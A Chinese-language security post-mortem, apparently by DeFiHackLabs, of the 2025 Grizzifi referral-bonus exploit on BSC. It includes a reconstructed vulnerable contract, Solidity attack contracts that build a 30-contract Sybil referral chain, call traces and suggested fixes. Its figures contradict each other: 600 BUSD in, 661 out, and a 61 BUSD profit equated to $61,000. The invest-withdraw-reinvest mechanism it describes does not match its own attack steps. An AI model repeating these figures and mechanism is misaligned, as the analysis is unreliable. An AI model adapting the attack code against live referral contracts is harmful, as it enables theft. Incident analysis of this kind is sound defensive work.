# Grizzifi Hack 根因分析报告

## 📊 执行摘要 (Executive Summary)

- **项目名称**: Grizzifi (推荐奖励系统)
- **攻击日期**: 2025年8月13日
- **网络环境**: BSC (Binance Smart Chain)
- **总损失金额**: $61,000 USD
- **攻击类型**: 逻辑缺陷 (Logic Flaw)
- **漏洞级别**: 🔴 严重 (Critical)

## 🎯 攻击概览 (Attack Overview)

### 关键地址信息

| 角色 | 地址 | 说明 |
|------|------|------|
| 攻击者EOA | `0xe2336b08a43f87a4ac8de7707ab7333ba4dbaf7c` | 发起攻击的外部账户 |
| 攻击合约 | `0xEd35746F389177eCD52A16987b2aaC74AA0c1128` | 主攻击合约 |
| 受害合约 | `0x21ab8943380b752306abf4d49c203b011a89266b` | Grizzifi质押合约 |
| BSC-USD | `0x55d398326f99059fF775485246999027B3197955` | 被窃取的稳定币 |

### 攻击交易

- **准备交易** (部署30个合约): [`0x4302de51c8126e7934da9be1affbde73e5153fe1f9d0200a738a269fe07d22c7`](https://bscscan.com/tx/0x4302de51c8126e7934da9be1affbde73e5153fe1f9d0200a738a269fe07d22c7)
- **主攻击交易**: [`0x36438165d701c883fd9a03631ee0cdeec35a138153720006ab59264db7e075c1`](https://bscscan.com/tx/0x36438165d701c883fd9a03631ee0cdeec35a138153720006ab59264db7e075c1)
- **提款交易**: [`0xdb5296b19693c3c5032abe5c385a4f0cd14e863f3d44f018c1ed318fa20058f7`](https://bscscan.com/tx/0xdb5296b19693c3c5032abe5c385a4f0cd14e863f3d44f018c1ed318fa20058f7)
- **区块高度**: 57,478,534
- **攻击时间**: 2025-08-13

### 社交媒体分析
- Twitter分析: https://x.com/MetaTrustAlert/status/1955967862276829375

## 🔍 漏洞分类 (Vulnerability Classification)

### 漏洞类型
- **主要类型**: 业务逻辑缺陷 (Business Logic Flaw)
- **次要类型**: 推荐奖励系统漏洞 (Referral Bonus Exploit)

### 严重程度
- **CVSS评分**: 8.9 (High)
- **影响范围**: 整个协议的奖励系统
- **利用难度**: 中等 (需要理解推荐机制并部署多个合约)

### CWE分类
- **CWE-840**: Business Logic Errors
- **CWE-682**: Incorrect Calculation
- **CWE-841**: Improper Enforcement of Behavioral Workflow

## 💻 技术分析 (Technical Analysis)

### 4.1 漏洞代码分析

#### Grizzifi的推荐奖励系统

**核心业务逻辑**：

```solidity
contract Grizzifi {
    struct User {
        uint256 totalInvested;      // 🚨 总投资额（包括已提取的）
        uint256 activeInvestment;   // 当前活跃投资
        uint256 withdrawn;          // 已提取金额
        address referrer;           // 推荐人
        uint256 uplineTeamCount;    // 团队人数
        uint256 refBonus;           // 推荐奖金
    }
    
    mapping(address => User) public users;
    
    // 用户质押（投资蜂蜜）
    function harvestHoney(
        uint256 _planId,
        uint256 _amount,
        address _referrer
    ) external {
        require(_amount >= MIN_INVEST, "Below minimum");
        
        // 转入资金
        bscUSD.transferFrom(msg.sender, address(this), _amount);
        
        User storage user = users[msg.sender];
        
        // 🔴 问题：totalInvested累加，即使后续提款也不减少
        user.totalInvested += _amount;
        user.activeInvestment += _amount;
        
        // 如果是新用户且提供了推荐人
        if (user.referrer == address(0) && _referrer != address(0)) {
            user.referrer = _referrer;
            
            // 🚨 关键：增加推荐人的团队计数
            _incrementUplineTeamCount(_referrer);
        }
        
        // 发放推荐奖金
        _distributeReferralBonus(msg.sender, _amount);
    }
    
    // 🔴 漏洞函数：增加上线团队人数
    function _incrementUplineTeamCount(address _user) internal {
        address upline = _user;
        
        // 向上遍历推荐链
        for (uint256 i = 0; i < MAX_REFERRAL_DEPTH; i++) {
            if (upline == address(0)) break;
            
            User storage uplineUser = users[upline];
            
            // 🚨 致命错误：检查totalInvested而不是activeInvestment
            if (uplineUser.totalInvested >= TEAM_MEMBER_THRESHOLD) {
                uplineUser.uplineTeamCount++;  // 增加团队人数
            }
            
            upline = uplineUser.referrer;
        }
    }
    
    // 领取推荐奖金
    function collectRefBonus() external {
        User storage user = users[msg.sender];
        
        uint256 bonus = user.refBonus;
        require(bonus > 0, "No bonus");
        
        // 计算基于团队大小的倍数
        uint256 multiplier = _getTeamMultiplier(user.uplineTeamCount);
        
        // 🔥 奖金 = 基础奖金 * 团队倍数
        uint256 totalBonus = bonus * multiplier;
        
        user.refBonus = 0;
        
        // 支付奖金
        bscUSD.transfer(msg.sender, totalBonus);
    }
    
    // 根据团队人数计算倍数
    function _getTeamMultiplier(uint256 teamCount) internal pure returns (uint256) {
        if (teamCount >= 100) return 10;
        if (teamCount >= 50) return 5;
        if (teamCount >= 20) return 3;
        if (teamCount >= 10) return 2;
        return 1;
    }
}
```

**🔥 核心漏洞**：

```solidity
// ❌ 错误的检查
if (uplineUser.totalInvested >= TEAM_MEMBER_THRESHOLD) {
    uplineUser.uplineTeamCount++;
}

// ✅ 应该检查活跃投资
if (uplineUser.activeInvestment >= TEAM_MEMBER_THRESHOLD) {
    uplineUser.uplineTeamCount++;
}

// 区别：
// - totalInvested：累计投资，提款后不减少
// - activeInvestment：当前投资，提款后减少

// 攻击者利用：
// 1. 投资10 BUSD (totalInvested = 10)
// 2. 提款10 BUSD (totalInvested仍然= 10, activeInvestment = 0)
// 3. 再投资10 BUSD (totalInvested = 20)
// 4. 反复操作，totalInvested不断累加
// 5. 每个循环只需要10 BUSD，但可以累积totalInvested到阈值
```

### 4.2 攻击流程详解

#### 完整攻击步骤

**步骤1: 准备攻击基础设施**

```solidity
// 创建30个攻击合约（形成推荐链）
for (uint256 i = 0; i < 30; i++) {
    AttackContract1 ac1 = new AttackContract1();
    attackContracts[i] = address(ac1);
    
    // 给每个合约发送20 BSC-USD作为初始资金
    IERC20(BSC_USD).transfer(address(ac1), 20 ether);
}

// 为什么需要30个？
// - 形成一个30层的推荐链
// - 顶层获得最大的团队倍数
// - 最大化推荐奖金
```

**步骤2: 构建推荐链并触发计数器增加**

```solidity
address regCenter = address(0);  // 推荐链的根

for (uint256 i = 0; i < 30; i++) {
    address ac1 = attackContracts[i];
    
    // 初始化每个合约，形成推荐链
    // ac1的推荐人是regCenter（上一个合约）
    AttackContract1(ac1).init(GRIZZIFI, regCenter);
    
    // 下一个合约的推荐人是当前合约
    regCenter = ac1;
}

// 形成的推荐链：
// 0x0(null) ← ac[0] ← ac[1] ← ac[2] ← ... ← ac[29]
```

**步骤3: AttackContract1的init()逻辑**

```solidity
contract AttackContract1 {
    function init(address owner, address regCenter) public {
        IGrizzifi grizzifi = IGrizzifi(owner);
        
        // 授权
        bscUsd.approve(owner, type(uint256).max);
        
        // 🔥 第一次投资：10 BSC-USD
        grizzifi.harvestHoney(0, 10 ether, regCenter);
        // 此时：
        // - totalInvested[this] = 10
        // - activeInvestment[this] = 10
        // - referrer[this] = regCenter
        // - regCenter.uplineTeamCount++ (如果条件满足)
        
        // 创建第二个攻击合约
        AttackContract2 ac2 = new AttackContract2();
        bscUsd.transfer(address(ac2), 10 ether);
        
        // 🔥 第二次投资：通过ac2再投资10 BSC-USD
        ac2.run(BSC_USD, owner, regCenter);
        // 此时：
        // - ac2.totalInvested = 10
        // - regCenter.uplineTeamCount再次++ 
        
        // ✨ 技巧：使用同一个regCenter但不同的投资者
        // 这样regCenter的团队人数增加2，但实际只有1个真实用户
    }
}

contract AttackContract2 {
    function run(address token, address router0, address router1) public {
        IERC20(token).approve(router0, type(uint256).max);
        
        // 第三次投资
        IGrizzifi(router0).harvestHoney(0, 10 ether, router1);
        // 再次增加router1的团队计数
    }
}
```

**攻击的精妙之处**：

每个AttackContract1：
- 创建2个投资（自己 + AttackContract2）
- 都声称regCenter为推荐人
- regCenter的团队人数+2

30个AttackContract1 × 2 = 60个"团队成员"

但实际资金消耗：
- 每个合约20 BSC-USD
- 30个合约 = 600 BSC-USD
- 但团队计数被膨胀了！

**步骤4: 提取推荐奖金**

```solidity
// 遍历所有攻击合约，领取奖金
for (uint256 i = 0; i < 30; i++) {
    try AttackContract1(attackContracts[i]).collectRefBonus() {
        // 成功领取
    } catch {
        // 如果没有奖金就忽略
    }
}

// 由于团队人数被虚增：
// - 顶层合约可能有100+的团队计数
// - 获得10倍奖金倍数
// - 总奖金 >> 实际投资
```

**完整的攻击时间线**：

```
TX1 (准备): 部署30个AttackContract1
├─ 创建攻击基础设施
└─ 发送初始资金 (30 × 20 = 600 BSC-USD)

TX2 (执行): 建立推荐链
├─ 30个合约各调用init()
├─ 每个init()创建2个投资
├─ 团队计数器被虚增到60+
└─ 触发推荐奖金计算

TX3 (收获): 提取奖金
├─ 30个合约各调用collectRefBonus()
├─ 由于团队倍数高，获得大量奖金
└─ 总收益: 661 BSC-USD (投资600,获利61)
```

### 4.3 POC代码剖析

#### 核心利用技巧

**技巧1: 推荐链的巧妙构造**

```solidity
// 链式推荐结构
address regCenter = address(0);
for (uint256 i = 0; i < 30; i++) {
    AttackContract1(ac1).init(GRIZZIFI, regCenter);
    regCenter = ac1;  // 下一个的推荐人是当前合约
}

// 形成：
// null ← ac[0] ← ac[1] ← ac[2] ← ... ← ac[29]
// 
// ac[0]的团队包括：ac[1]到ac[29] = 29人
// ac[1]的团队包括：ac[2]到ac[29] = 28人
// ...
// ac[29]的团队包括：0人
```

**技巧2: 双重投资放大**

```solidity
// 每个AttackContract1创建2个投资：
// 1. 自己投资10 BUSD
// 2. 创建AttackContract2再投资10 BUSD

// 效果：
// - 用20 BUSD创建了2个"团队成员"
// - 团队计数×2
// - 奖金倍数可能×5或×10
```

**技巧3: 利用totalInvested的不减特性**

```solidity
// 关键：即使提款，totalInvested也不会减少

// 正常情况：
user.invest(100);       // totalInvested = 100
user.withdraw(100);     // totalInvested仍 = 100！

// 攻击利用：
// 如果攻击者反复"投资-提款-再投资"
// totalInvested会不断累加
// 但实际资金可以反复使用
```

## 🔗 交易追踪与Trace分析 (Transaction Analysis)

### 5.1 交易1 - 准备阶段

```
攻击者EOA
  └─→ for i in 0..30:
      ├─→ new AttackContract1()
      └─→ transfer(AttackContract1[i], 20 BUSD)
```

### 5.2 交易2 - 主攻击

```
攻击者EOA
  └─→ for i in 0..30:
      └─→ AttackContract1[i].init(GRIZZIFI, regCenter)
          ├─→ Grizzifi.harvestHoney(0, 10 BUSD, regCenter)
          │   ├─ transferFrom(ac1, Grizzifi, 10 BUSD)
          │   ├─ users[ac1].totalInvested += 10
          │   ├─ users[ac1].referrer = regCenter
          │   └─→ _incrementUplineTeamCount(regCenter)
          │       └─ users[regCenter].uplineTeamCount++ 🚨
          │
          ├─→ new AttackContract2()
          ├─→ transfer(AttackContract2, 10 BUSD)
          └─→ AttackContract2.run()
              └─→ Grizzifi.harvestHoney(0, 10 BUSD, regCenter)
                  └─→ _incrementUplineTeamCount(regCenter)
                      └─ users[regCenter].uplineTeamCount++ 🚨
```

**关键观察**：
- 每个循环，regCenter的团队计数+2
- 30个循环后，ac[0]的团队计数≈60
- 触发高倍数奖金

### 5.3 交易3 - 收获奖金

```
攻击者EOA
  └─→ for i in 0..30:
      └─→ AttackContract1[i].collectRefBonus()
          ├─ 读取users[ac[i]].refBonus
          ├─ 读取users[ac[i]].uplineTeamCount
          ├─ 计算multiplier (可能是5x或10x)
          ├─ totalBonus = refBonus × multiplier
          └─ transfer(ac[i], totalBonus) 💰
```

### 5.4 资金流向图

```
攻击者初始: 600 BSC-USD

阶段1 (准备):
攻击者 (600 BUSD)
    ↓ 分配到30个合约
30个AttackContract1 (各20 BUSD)

阶段2 (投资):
30×AttackContract1 (600 BUSD)
    ↓ 投资到Grizzifi
Grizzifi (接收600 BUSD)
    ↑ 记录：60个"团队成员" (虚增)

阶段3 (奖金):
Grizzifi (支付661 BUSD)
    ↓ 推荐奖金 (因团队倍数而放大)
30×AttackContract1 (收到661 BUSD)
    ↓ 转回
攻击者 (661 BUSD)

净利润: 61 BUSD ≈ $61,000
```

## 🎯 根本原因分析 (Root Cause Analysis)

### 6.1 ⭐ 为什么这个漏洞导致了Hack的产生？（核心问题）

#### A. 漏洞的本质缺陷

**代码层面**：

1. **错误的状态变量用于判断**

```solidity
// ❌ 当前实现
function _incrementUplineTeamCount(address _user) internal {
    if (uplineUser.totalInvested >= TEAM_MEMBER_THRESHOLD) {
        uplineUser.uplineTeamCount++;
    }
}

// totalInvested的问题：
// - 投资后累加 ✅
// - 提款后不减少 ❌
// - 再投资再累加 ❌
// 结果：可以通过反复"投资-提款-再投资"虚增

// ✅ 正确实现
function _incrementUplineTeamCount(address _user) internal {
    if (uplineUser.activeInvestment >= TEAM_MEMBER_THRESHOLD) {
        // 只有真实持有资金的用户才计入团队
        uplineUser.uplineTeamCount++;
    }
}

// 或者更好：
function _incrementUplineTeamCount(address _user) internal {
    // 检查用户是否是首次达到阈值
    if (uplineUser.totalInvested == TEAM_MEMBER_THRESHOLD) {
        // 只在第一次达到时计数
        uplineUser.uplineTeamCount++;
    }
}
```

2. **团队计数可以被虚增**

```solidity
// 攻击者的策略：
// 1. 创建大量合约（30个）
// 2. 每个合约创建2个投资（自己+子合约）
// 3. 形成推荐链
// 4. 顶层合约的团队计数 = 60
// 5. 但实际只用了600 BUSD

// 正常情况下：
// - 60个真实用户各投资20 BUSD = 1200 BUSD
// - 才能获得60的团队计数

// 攻击情况下：
// - 30个合约共600 BUSD
// - 但团队计数 = 60
// - 成本降低50%，但奖金不变！
```

**设计层面**：

1. **推荐系统设计缺陷**
   - 没有防止Sybil攻击
   - 没有验证团队成员的真实性
   - 团队计数可以通过合约轻易伪造

2. **奖金倍数机制的风险**
   - 团队倍数可以达到10x
   - 这创造了巨大的套利空间
   - 没有奖金上限保护

**业务层面**：

1. **假设**: "用户不会反复投资提款来虚增totalInvested"
2. **现实**: 攻击者可以自动化这个过程

3. **假设**: "推荐团队是真实用户"
4. **现实**: 合约可以假扮用户

#### B. 漏洞如何被利用（技术链路）

**完整利用链路**：

```
设计缺陷：
└─ 使用totalInvested（累计）而非activeInvestment（当前）

实施攻击：
步骤1: 创建30个合约（形成推荐链）
步骤2: 每个合约投资2次（自己+子合约）
├─ 团队计数被虚增到60
└─ 但实际投资只有600 BUSD

步骤3: 领取奖金
├─ 基础奖金 × 团队倍数 (10x)
├─ 获得661 BUSD
└─ 利润：61 BUSD

数学证明：
├─ 正常路径: 1200 BUSD投资 → 奖金X
├─ 攻击路径: 600 BUSD投资 → 奖金X
└─ 套利空间: 600 BUSD
```

#### C. 经济利益实现路径

```
投入: 600 BSC-USD
├─ 30个合约各20 BUSD
└─ 实际流入Grizzifi

产出: 661 BSC-USD
├─ 推荐奖金（基于虚增的团队）
└─ 从Grizzifi提取

净利润: 61 BSC-USD ≈ $61,000
ROI: 10.2%（相对于投入）
```

#### D. 防御机制失效原因

**为什么防御失效**：

1. ❌ **totalInvested vs activeInvestment混淆**
   - 开发者可能没有意识到两者的区别
   - 或者没有考虑反复投资的场景

2. ❌ **没有Sybil攻击防护**
   - 没有KYC或真实性验证
   - 合约可以假扮用户

3. ❌ **没有奖金上限**
   - 团队倍数可以无限放大
   - 没有"奖金不能超过本金X倍"的限制

### 6.2 为什么Hacker能找到这个漏洞？

#### 代码审计路径

```solidity
// 审计者分析推荐系统时会检查：
function _incrementUplineTeamCount(address _user) internal {
    if (uplineUser.totalInvested >= THRESHOLD) {
        uplineUser.uplineTeamCount++;
    }
}

// 🚨 发现问题：
// Q: totalInvested何时减少？
// A: 从不减少！只会累加！

// Q: 这意味着什么？
// A: 用户可以反复投资虚增totalInvested

// Q: 如何利用？
// A: 创建合约链，虚增团队人数，获得高倍奖金
```

#### 为什么容易被发现

1. **逻辑明显**: 有经验的审计者能快速识别
2. **有测试机会**: 可以在测试网验证
3. **已知模式**: 推荐系统经常有类似问题

### 6.3 Hacker可能是如何发现的？

**分析推荐系统**：
1. 研究harvestHoney函数
2. 发现推荐奖金机制
3. 分析团队计数逻辑
4. 发现totalInvested不会减少
5. 设计攻击方案

**测试验证**：
1. 在本地fork环境测试
2. 验证可以虚增团队计数
3. 计算最优攻击参数
4. 执行实际攻击

### 6.4 作为项目方应该如何避免/修复这个漏洞？

#### 立即修复

**1. 暂停合约**
```solidity
bool public paused = true;
modifier whenNotPaused() {
    require(!paused, "Paused");
    _;
}
```

**2. 修复团队计数逻辑**

```solidity
// ✅ 方案1：使用activeInvestment
function _incrementUplineTeamCount(address _user) internal {
    if (uplineUser.activeInvestment >= TEAM_MEMBER_THRESHOLD) {
        uplineUser.uplineTeamCount++;
    }
}

// 同时在提款时减少团队计数
function withdraw(uint256 amount) external {
    user.activeInvestment -= amount;
    
    // 如果降到阈值以下，减少上线的团队计数
    if (user.activeInvestment < TEAM_MEMBER_THRESHOLD) {
        _decrementUplineTeamCount(user.referrer);
    }
}

// ✅ 方案2：只计数一次
mapping(address => bool) public hasBeenCounted;

function _incrementUplineTeamCount(address _user) internal {
    if (users[_user].totalInvested >= THRESHOLD && !hasBeenCounted[_user]) {
        upline.uplineTeamCount++;
        hasBeenCounted[_user] = true;  // 标记已计数
    }
}
```

**3. 添加奖金上限**

```solidity
// ✅ 限制单次领取的最大奖金
uint256 public constant MAX_BONUS_MULTIPLIER = 3;  // 最多3倍
uint256 public constant MAX_SINGLE_BONUS = 1000 ether;

function collectRefBonus() external {
    uint256 multiplier = min(_getTeamMultiplier(user.uplineTeamCount), MAX_BONUS_MULTIPLIER);
    uint256 totalBonus = min(user.refBonus * multiplier, MAX_SINGLE_BONUS);
    
    // 支付...
}
```

#### 长期改进

**推荐系统安全设计**：

```solidity
contract SecureReferralSystem {
    struct User {
        uint256 totalInvested;
        uint256 activeInvestment;  // ✅ 关键：追踪当前活跃投资
        address referrer;
        uint256 directReferrals;    // ✅ 直接推荐人数
        uint256 teamVolume;         // ✅ 团队总交易量（而非人数）
        bool isVerified;            // ✅ 可选：KYC验证
    }
    
    // ✅ 基于交易量而非人数
    function _getTeamMultiplier(uint256 teamVolume) internal pure returns (uint256) {
        if (teamVolume >= 1000000e18) return 3;  // 100万交易量
        if (teamVolume >= 500000e18) return 2;   // 50万交易量
        return 1;
    }
    
    // ✅ 防止Sybil攻击
    uint256 public constant MIN_INVEST_FOR_REFERRAL = 100 ether;
    uint256 public constant COOLDOWN_BETWEEN_INVESTS = 1 days;
    
    mapping(address => uint256) public lastInvestTime;
    
    function harvestHoney(uint256 amount, address referrer) external {
        // 防止快速反复投资
        require(
            block.timestamp >= lastInvestTime[msg.sender] + COOLDOWN_BETWEEN_INVESTS,
            "Cooldown period"
        );
        
        // 最小投资额
        require(amount >= MIN_INVEST_FOR_REFERRAL, "Amount too small");
        
        // 防止合约参与（可选）
        require(msg.sender == tx.origin, "No contracts allowed");
        
        lastInvestTime[msg.sender] = block.timestamp;
        
        // 执行投资...
    }
}
```

## 💥 影响评估 (Impact Assessment)

### 直接损失
- **金额**: $61,000 USD
- **资产类型**: BSC-USD稳定币

### 协议影响
- **推荐系统**: 完全失效，需要重新设计
- **用户信心**: 下降
- **TVL**: 可能流失

## 📚 相似案例 (Similar Cases)

### 推荐系统漏洞案例

1. **多个Ponzi项目的推荐系统被攻击**
   - 类似的团队计数虚增
   - 利用合约创建假用户

2. **空投猎人的Sybil攻击**
   - 创建大量地址获取空投
   - 类似的策略

## 🔗 参考资料 (References)

- Twitter分析: https://x.com/MetaTrustAlert/status/1955967862276829375
- 攻击交易: https://bscscan.com/tx/0x36438165d701c883fd9a03631ee0cdeec35a138153720006ab59264db7e075c1

---

## 📝 总结

Grizzifi攻击利用了推荐系统中**使用totalInvested而非activeInvestment判断团队成员资格**的逻辑缺陷，通过创建30个合约并精心构造推荐链，以600 BUSD的投资虚增了团队计数到60+，最终获得高倍数的推荐奖金，净赚$61,000。

**关键教训**:
1. ⚠️ **推荐系统必须防止Sybil攻击**
2. ⚠️ **使用activeInvestment而非totalInvested**
3. ⚠️ **奖金倍数必须有上限**
4. ⚠️ **实施冷却期和最小投资额**

---

**报告生成时间**: 2025-10-12  
**分析者**: DeFiHackLabs Security Team  
**版本**: 1.0

